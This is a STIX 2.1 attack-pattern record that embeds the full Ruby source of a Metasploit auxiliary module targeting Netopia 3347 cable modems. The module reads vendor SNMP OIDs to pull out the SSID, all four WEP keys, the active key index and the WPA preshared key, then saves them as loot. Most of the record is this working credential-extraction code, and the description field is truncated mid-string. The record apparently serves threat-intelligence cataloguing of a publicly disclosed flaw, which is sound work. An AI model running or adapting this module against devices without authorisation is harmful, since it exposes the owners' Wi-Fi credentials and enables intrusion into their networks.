{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d27e8fd-0a92-46cd-ad27-f51270530c4b",
    "created": "2024-08-14T16:27:47.689848Z",
    "modified": "2024-08-14T16:27:47.689851Z",
    "name": "Netopia 3347 Cable Modem Wifi Enumeration",
    "description": " This module extracts WEP keys and WPA preshared keys from certain Netopia cable modems.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/netopia_enum.rb",
            "external_id": "netopia_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Netopia 3347 Cable Modem Wifi Enumeration',\n      'Description' => %q{\n        This module extracts WEP keys and WPA preshared keys from\n        certain Netopia cable modems.\n      },\n      'References'  =>\n        [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string/' ]\n        ],\n      'Author'      => ['Deral \"PercentX\" Heiland'],\n      'License'     => MSF_LICENSE\n    )\n\n  end\n\n  def run_host(ip)\n      output_data = {}\n    begin\n      snmp = connect_snmp\n\n      if snmp.get_value('sysDescr.0') =~ /Netopia 3347/\n\n      wifistatus = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.1.0')\n        if wifistatus == \"1\"\n        wifiinfo = \"\"\n        ssid = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.2.1')\n        print_good(\"#{ip}\")\n        print_good(\"SSID: #{ssid}\")\n        wifiinfo << \"SSID: #{ssid}\" << \"\\n\"\n\n          wifiversion = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.4.1')\n            if wifiversion == \"1\"\n\n            # WEP enabled\n            elsif wifiversion == (\"2\"||\"3\")\n              wepkey1 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.1')\n              print_good(\"WEP KEY1: #{wepkey1}\")\n              wifiinfo << \"WEP KEY1: #{wepkey1}\" << \"\\n\"\n              wepkey2 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.2')\n              print_good(\"WEP KEY2: #{wepkey2}\")\n              wifiinfo << \"WEP KEY2: #{wepkey2}\" << \"\\n\"\n              wepkey3 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.3')\n              print_good(\"WEP KEY3: #{wepkey3}\")\n              wifiinfo << \"WEP KEY3: #{wepkey3}\" << \"\\n\"\n              wepkey4 = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.15.1.3.4')\n              print_good(\"WEP KEY4: #{wepkey4}\")\n              wifiinfo << \"WEP KEY4: #{wepkey4}\" << \"\\n\"\n              actkey = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.13.0')\n              print_good(\"Active Wep key is Key#{actkey}\")\n              wifiinfo << \"Active WEP key is KEY#: #{actkey}\" << \"\\n\"\n\n            # WPA enabled\n            elsif wifiversion == \"4\"\n              print_line(\"Device is configured for WPA \")\n              wpapsk = snmp.get_value('1.3.6.1.4.1.304.1.3.1.26.1.9.1.5.1')\n              print_good(\"WPA PSK: #{wpapsk}\")\n              wifiinfo << \"WPA PSK: #{wpapsk}\" << \"\\n\"\n\n            # WPA Enterprise enabled\n            elsif wifiversion == \"5\"\n              print_line(\"Device is configured for WPA enterprise\")\n              else\n              print_line(\"FAILED\")\n            end\n\n      else\n         print_line(\"WIFI is not enabled\")\n      end\n    end\n     # Woot we got loot.\n     loot_name     = \"netopia_wifi\"\n     loot_type     = \"text/plain\"\n     loot_filename = \"netopia_wifi.txt\"\n     loot_desc     = \"Netopia Wifi configuration data\"\n     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)\n     print_good(\"WiFi Data saved: #{p}\")\n\n     rescue ::SNMP::UnsupportedVersion\n     rescue ::SNMP::RequestTimeout\n     rescue ::Interrupt\n       raise $!\n     rescue ::Exception => e\n       print_error(\"#{ip} - Error: #{e.class} #{e}\")\n     disconnect_snmp\n     end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Deral \"PercentX\" Heiland]",
        ""
    ]
}